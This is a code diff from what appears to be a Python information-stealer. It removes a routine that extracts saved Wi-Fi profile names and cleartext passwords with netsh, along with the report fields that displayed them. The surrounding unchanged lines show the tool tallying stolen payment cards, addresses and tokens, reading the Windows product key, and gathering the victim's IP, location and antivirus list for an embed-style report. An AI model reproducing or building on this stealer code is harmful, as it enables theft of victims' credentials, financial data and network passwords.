@@ -572,17 +572,6 @@ Antivirus: {avlist}
                 shutil.copy2(os.path.join(gdf, _file), gd + os.sep + _file)
     
     def SendInfo(self):
-        command_output = subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output=True).stdout.decode()
-        profile_names = set(re.findall(r"All User Profile\s*:(.*)", command_output))
-        wifi_data = ""
-        for profile in profile_names:
-            profile = profile.strip()
-            profile_info = subprocess.run(["netsh", "wlan", "show", "profile", profile, "key=clear"], capture_output=True).stdout.decode()
-            profile_password = re.findall(r"Key Content\s*:(.*)", profile_info)
-            if len(profile_password) == 0:
-                wifi_data += f"{profile}: Open\n"
-            else:
-                wifi_data += f"{profile}: {profile_password[0].strip()}\n"
         wname = self.getProductValues()[0]
         wkey = self.getProductValues()[1]
         ip = country = city = region = googlemap = "None"
@@ -630,9 +619,6 @@ Antivirus: {avlist}
                                                    f'<a:dancingblob:873253607749857280> Cards Found: {self.stats["cards"]}\n'
                                                    f'<a:dancingblob:873253607749857280> Addresses Found: {self.stats["addresses"]}\n'
                                                    f'<a:dancingblob:873253607749857280> Tokens Found: {self.stats["tokens"]}\n'
-                                                   f'<a:dancingblob:873253607749857280> **Net Profile Names:** ```{profile_names}```\n'
-                                                   f'<a:dancingblob:873253607749857280> **Network Info** ```{profile_info}```\n'
-                                                   f'<a:dancingblob:873253607749857280> **Currently Connected** ```{profile}\n{profile_password}```\n'
                                                    f'<a:dancingblob:873253607749857280> Time: {"{:.2f}".format(time.time() - self.starttime)}s',
                                                    
                                     "inline": False,
